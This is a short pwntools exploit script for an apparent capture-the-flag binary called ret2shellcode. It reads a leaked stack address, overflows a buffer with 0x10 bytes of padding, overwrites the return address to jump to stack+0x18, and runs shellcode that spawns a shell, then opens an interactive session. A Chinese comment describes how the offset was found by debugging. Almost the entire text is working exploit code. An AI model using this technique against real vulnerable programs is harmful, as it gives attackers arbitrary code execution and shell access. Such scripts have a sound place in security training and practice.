from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./ret2shellcode')
elf=ELF('./ret2shellcode')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(p, 'b *0x401229')
p.recvuntil('gift : ')
stack=int(p.recv(14),16)
offset=0x10
payload = offset*b'a' + p64(stack+0x18) + asm(shellcraft.sh())
# payload = offset*b'a' + p64(stack) + b"stopstop"*5 #通过调试计算写入的shellcode偏移0x18,,search stopstop
p.success('%s -> 0x%x' % ('stack', stack))
p.sendline(payload)
# pause()
p.interactive()